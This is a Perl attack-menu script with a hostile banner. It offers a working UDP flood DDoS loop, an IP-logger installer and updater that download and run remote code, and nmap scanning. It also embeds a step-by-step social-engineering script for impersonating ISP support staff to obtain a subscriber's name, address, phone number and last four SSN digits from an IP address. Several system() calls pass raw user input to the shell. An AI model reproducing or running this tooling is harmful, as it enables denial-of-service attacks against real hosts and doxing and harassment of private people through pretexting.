#!/usr/bin/perl
#!/usr/bin/env bash

use Socket;
use Term::ANSIColor;
use WWW::Mechanize;
use JSON;
use Socket;

$SIG{INT} = \&tsktsk;

sub tsktsk {
    $SIG{INT} = \&tsktsk;
	system("clear");
    warn "\aThanks For Using Rtos Traced Script!\n";
	sleep(2);
	exit;
}

system("echo -ne '\e[8;24;79t'");
system("clear");
print "\n";
print color 'bold bright_green';print "              ▄▄▄█████▓ ██▀███   ▄▄▄      ";print color 'bold bright_red'; print "▄████▄  ▓█████ ▓█████▄ \n";
print color 'bold bright_green';print "              ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ";print color 'bold bright_red';print "▒██▀ ▀█  ▓█   ▀ ▒██▀ ██▌\n";
print color 'bold bright_green';print "              ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ";print color 'bold bright_red';print "▒▓█    ▄ ▒███   ░██   █▌\n";
print color 'bold bright_green';print "              ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ";print color 'bold bright_red';print "▒▓▓▄ ▄██▒▒▓█  ▄ ░▓█▄   ▌\n";
print color 'bold bright_green';print "                ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒";print color 'bold bright_red';print " ▓███▀ ░░▒████▒░▒████▓ \n";
print color 'bold bright_green';print "                ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░";print color 'bold bright_red';print " ░▒ ▒  ░░░ ▒░ ░ ▒▒▓  ▒ \n";
print color 'bold bright_green';print "                  ░      ░▒ ░ ▒░  ▒   ▒▒ ░ ";print color 'bold bright_red';print " ░  ▒    ░ ░  ░ ░ ▒  ▒ \n";
print color 'bold bright_green';print color 'bold bright_green';print "                ░        ░░   ░   ░   ▒   ░";print color 'bold bright_red';print "           ░    ░ ░  ░ \n";
print color 'bold bright_green';print "                          ░           ░  ░░ ░";print color 'bold bright_red';print "         ░  ░   ░    \n";
print color 'bold bright_green';print "                                          ░";print color 'bold bright_red';print "                ░      \n";
print color 'bold yellow';
print "                                [W3lcome Fucker]";print color 'bold white';
print "\n\n";
print "===============================================================================\n";
print "                                                                               \n";                               
print "             1. Geo-locate IP     2. DDoS              3. Port Scan            \n";
print "             4. Dstat             5. Ping              6. Kill Attacks         \n";
print "             7. Change Pass       8. Web Resolver      9. IP Logger            \n"; 
print "             10. Update Script    11."; print color 'bold bright_red';print " Credits             \n";print color 'bold white';   
print "                                                                               ";  
print "===============================================================================\n\n";

print "                                 #: "; print color 'bold bright_red'; $ip = <>;

if ($ip == 1) {
	system("echo -ne '\e[8;29;79t'");
system("clear");
 
print color 'bold bright_green';
print q{                                          
               ___ ____            _                 _             
              |_ _|  _ \          | | ___   ___ __ _| |_ ___  _ __ 
               | || |_) |  _____  | |/ _ \ / __/ _` | __/ _ \| '__|
               | ||  __/  |_____| | | (_) | (_| (_| | || (_) | |   
              |___|_|             |_|\___/ \___\__,_|\__\___/|_|   
	
	
};

print "                                 Enter An IP: 
                                "; print color 'bold bright_red'; $ip = <>;
 
print color 'bold bright_green';

my $GET=WWW::Mechanize->new();
    $GET->get("http://ip-api.com/json/$ip");
    my $json = $GET->content();

my $info = decode_json($json);
print color 'bold bright_white';
print color 'bold bright_red';
print "-------------------------------------------------------------------------------";
$status = $info->{'status'};
if ($status eq "fail") {
	$printcolorer = 'bold bright_red';
	$statuscheck = "x";
} else {
	$printcolorer = 'bold bright_green';
	$statuscheck = "✔"
}
print color 'bold white';
print "

          [";
print color 'bold bright_green';
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold bright_white';
print "]";
print " IP: ", $info->{'query'}, "\n";
print color 'bold white';
print "          [";
print color 'bold bright_green';
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold white';
print "]";
print " ORG: ", $info->{'as'}, "";
$orggs = $info->{'as'};
if ($orggs eq "") {
	print "N/A", "\n";
} else {
print "\n";
}
print color 'bold white';
print "          [";
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold bright_white';
print "]";
print " ISP: ", $info->{'isp'}, "";
$ispss = $info->{'isp'};
if ($ispss eq "") {
	print "N/A", "\n";
} else {
print "\n";
}
print "          [";
print color 'bold bright_green';
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold white';
print "] Country: ", $info->{'country'}," - ", $info->{'countryCode'}, "\n";
print "          [";
print color 'bold bright_green';
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold white';
print "] Region: ", $info->{'regionName'}, "(" , $info->{'region'}, ")", "\n";
print "          [";
print color 'bold bright_green';
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold white';
print "] Timezone: ", $info->{'timezone'}, "\n";
print "          [";
print color 'bold bright_green';
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold white';
print "] City: ", $info->{'city'};
$citys = $info->{'city'};
if ($citys eq "") {
	print "N/A", "\n";
} else {
print "\n";
}
print "          [";
print color 'bold bright_green';
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold white';
print "] Zip Code: ", $info->{'zip'}; 
$zips = $info->{'zip'};
if ($zips eq "") {
	print "N/A", "\n";
} else {
print "\n";
}
print color 'bold white';
print "          [";
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold white';
print "] Coordinates: ", $info->{'lat'}, ", ", $info->{'lon'}, "\n";
print "          [";
print color 'bold bright_green';
print color $printcolorer;
print "", $statuscheck, "";
print color 'bold white';
print "] Status: ", $info->{'status'}, "\n";
$isps = $info->{'isp'};
if ($isps eq "AT&T Wireless") {
	print "          [";
	print color 'bold bright_green';
	print color $printcolorer;
print "", $statuscheck, "";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_green';
	print " ISP Dox Method Avaliable! Type 1 to view method.", "\n\n";
}
elsif ($isps eq "Spectrum") {
	print "          [";
	print color 'bold bright_green';
	print color $printcolorer;
print "", $statuscheck, "";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_green';
	print " ISP Dox Method Avaliable! Type 1 to view method.", "\n\n";
}
elsif ($isps eq "Comcast Cable") {
	print "          [";
	print color 'bold bright_green';
	print color $printcolorer;
print "", $statuscheck, "";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_green';
	print " ISP Dox Method Avaliable!", "\n\n";
}
elsif ($isps eq "Time Warner Cable Type 1 to view method.") {
	print "          [";
	print color 'bold bright_green';
	print color $printcolorer;
	print "", $statuscheck, "";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_green';
	print " ISP Dox Method Avaliable! Type 1 to view method.", "\n\n";
}
elsif ($isps eq "Verizon Fios") {
	print "          [";
	print color 'bold bright_green';
	print color $printcolorer;
	print "", $statuscheck, "";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_green';
	print " ISP Dox Method Avaliable! Type 1 to view method.", "\n\n";
}
elsif ($isps eq "CenturyLink") {
	print "          [";
	print color 'bold bright_green';
	print color $printcolorer;
	print "", $statuscheck, "";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_green';
	print " ISP Dox Method Avaliable! Type 1 to view method.", "\n\n";
}
elsif ($isps eq "WideOpenWest") {
	print "          [";
	print color 'bold bright_green';
	print color $printcolorer;
	print "", $statuscheck, "";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_green';
	print " ISP Dox Method Avaliable! Type 1 to view method.", "\n\n";
}
elsif ($isps eq "Cox Communications") {
	print "          [";
	print color 'bold bright_green';
	print color $printcolorer;
	print "", $statuscheck, "";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_green';
	print " ISP Dox Method Avaliable! Type 1 to view method.", "\n\n"; 
} else {
	print "          [";
	print color 'bold bright_red';
	print "x";
	print color 'bold white';
	print "]"; 
	print color 'bold bright_red';
	print " ISP Dox Method Unavaliable!", "\n\n"; 
}
print color 'bold bright_red';
print "-------------------------------------------------------------------------------";
print "                                                                               ";
print color 'bold bright_green';
print color 'bold white';
my $doxinformation = "	
Things you need:
* Basic Social Engineering Skills.
* Intelligence
* Skype

Once you have that number, get on Skype and call. These are Toll-Free Numbers, so don't worry about Credits.

Keep Pressing Buttons/Etc. to get to the Live Representative.

Each ISP has their own Program that they use for looking up Customer Information. Here is a list of Major US Providers and their Tools.


AT&T
â¢ Systems: CCTP (Call Center Transformation Program), G2

Cox
â¢ Systems: Icon, Polar

Charter
â¢ Systems: Sigma, IRIS

Comcast
â¢ Systems: ACSR, Comtrac, CSG, Einstien, Grandslam, Vision

Time Warner / Road Runner
â¢ Systems: Real, Unify

Verizon
â¢ Systems: Coffee

CenturyLink
â¢ Systems: IREP , Ensemble

Wide Open West
â¢ Systems: Must , Tier One

Once you are talking to a Representative, you can follow this script, and modify it with your own information/etc. Going to be using Comcast as an example.

*You: Hello, My name is Joe , and I'm with Tech Support. I was trying to look up a Customerâs Account Information in Grandslam, when our systems crashed. I currently cannot open up Grandslam or CSG. I was wondering if you could help me out and look up a customerâs information on your end. Thanks.
Agent: They will ask you for a Phone number. Reply with:
*You: Unfortunately, I only have their IP address, since I was in Live Chat with them. I have them on scheduled called back in 3 hours. I know Grandslam can look up Customer Info with an IP, can you try it in that.
Agent: Sure... blah, blah, give them the IP.
* You: They should look everything up. You can ask for:
* Name on the account
* Address
* Phone Number
* Account Number
* Last Four of the SSN
	\n";
if ($isps eq "AT&T Wireless") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");

}else {
	system("perl menu.pl");
}
}
if ($isps eq "Spectrum") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");
}else {
	system("perl menu.pl");
}
}
if ($isps eq "Comcast Cable") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");
}else {
	system("perl menu.pl");
}
}
if ($isps eq "Time Warner Cable") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");
}else {
	system("perl menu.pl");
}
}
if ($isps eq "Verizon Fios") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");
}else {
	system("perl menu.pl");
}
}
if ($isps eq "Spectrum") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");
}else {
	system("perl menu.pl");
}
}
if ($isps eq "CenturyLink") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");
print "Press Enter To Continue!"; <>;
system("perl menu.pl");
}else {
	system("perl menu.pl");
}
}
if ($isps eq "WideOpenWest") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");
}else {
	system("perl menu.pl");
}
}
if ($isps eq "Cox Communications") {
	print "                   Type An Option Or Press Enter To Continue! "; my $options = <>;
if ($options == 1) {
    print "", $doxinformation, "";
print " ┌─[Press Enter To Continue]\n";
print " └─────► "; <>;
system("perl menu.pl");
}else {
	system("perl menu.pl");
}
} else {
	print color 'bold white';
						   print "
                           ┌─[Press Enter To Continue]
                           └─────►"; <>;
						   system("perl menu.pl");
}
}

if ($ip == 2) {
	system("clear");
print color 'bold white';
print "===============================================================================";
print color 'bold red';
print q{             ____  ____   ___  ____    ____            _       _   
            |  _ \|  _ \ / _ \/ ___|  / ___|  ___ _ __(_)_ __ | |_ 
            | | | | | | | | | \___ \  \___ \ / __| '__| | '_ \| __|
            | |_| | |_| | |_| |___) |  ___) | (__| |  | | |_) | |_ 
            |____/|____/ \___/|____/  |____/ \___|_|  |_| .__/ \__|
                                                        |_|        };
print color 'bold white';
print "\n===============================================================================\n\n";
print "                                 Enter A IP : "; print color 'bold bright_green'; my $ip = <>; print color 'bold white';
print "                                Enter A Port[80]: "; print color 'bold bright_green'; my $port = <>; print color 'bold white';
print "                               Enter A Time[300]: "; print color 'bold bright_green'; my $time = <>; print color 'bold white';
print "                            Enter Packet Size[65500]: "; print color 'bold bright_green'; my $size = <>; print color 'bold white';
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print color 'bold red';
print "\n                       ~To cancel the attack press \'Ctrl-C\'\n\n";
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
print color 'bold yellow';
print "                                 Attack Finished!";
	sleep(3);
system("perl menu.pl");
}
if ($ip == 3) {
	system("clear");
print "\n";
print "                      Enter A Hostname : "; print color 'bold bright_green'; my $nmapscanner = <>; print color 'bold white';
system("nmap -sS $nmapscanner");
						   print "                             \n";
						   print "Press Enter To Finish! "; <>; system("perl menu.pl");
}
if ($ip == 4) {
	system("clear");
print "\n                          ~To cancel DSTAT press \'Ctrl-C\'\n\n";
system("dstat -rn");
system("perl menu.pl");
}
if ($ip == 5) {
	system("clear");
print "\n                          ~To stop pinging press \'Ctrl-C\'\n\n";
print "                                 Enter A IP : "; print color 'bold bright_green'; my $iptoping = <>; print color 'bold white';
system("ping $iptoping");
sleep(1);
system("perl menu.pl");
}
if ($ip == 6) {
	system("killall perl");
system("perl menu.pl");
}
if ($ip == 7) {
	system("clear");
print color 'bold white';
system("passwd");
sleep(1);
system("perl menu.pl");
}
if ($ip == 8) {
	system("clear");
print "\n                               Enter A Website: "; print color 'bold white'; $ip = <>;
system("clear");
print color 'bold bright_green';

my $GET=WWW::Mechanize->new();
    $GET->get("http://ip-api.com/json/$ip");
    my $json = $GET->content();

my $info = decode_json($json);
print color 'bold bright_red';
print "\n\n\n\n\n\n\n\n\n\n                       Website's IP Address: "; print color 'bold white'; print "", $info->{'query'}, "\n\n";
						   print "                             ";
						   print "Press Enter To Finish! "; <>; system("perl menu.pl");
}
if ($ip == 9) {
	system("clear");
print color 'bold white';
system("cd /var/www/html;rm -rf troll.gif;wget https://raw.githubusercontent.com/xRtos/geolocation-php-logger/master/troll.gif");
system("cd /var/www/html;git clone https://github.com/xRtos/geolocation-php-logger.git;cd /var/www/html/geolocation-php-logger;mv * /var/www/html");
system("cd /var/www/html;rm -rf geolocation-php-logger");
system("cd /var/www/html;chmod 777 index.php;chmod 777 visitors.html");
system("cd /var/www/html; rm -rf menu.pl;rm -rf update;rm -rf update.pl;rm -rf updater");
system("clear");
print color 'bold red'; print "\n  IP Logger Started, give out your server/hostname ip for it to log their ip!\n\n";print color 'bold white';
system("tail -F /var/www/html/visitors.html");
system("perl menu.pl");
}
if ($ip == 10) {
	system("clear");
print color 'bold white';
system("rm -rf update");
system("rm -rf update.pl");
system("rm -rf menu.pl");
system("wget https://raw.githubusercontent.com/xRtos/geolocation-php-logger/master/updater/update");
system("wget https://raw.githubusercontent.com/xRtos/geolocation-php-logger/master/updater/update.pl");
system("rm -rf menu.pl");
system("perl update.pl");
system("rm -rf update.pl");
system("rm -rf update");
system("perl menu.pl");
} else {
	print color 'bold red';
						   print "                              ";
						   print "Enter A Valid Option! "; <>;
						   system("perl menu.pl");
}
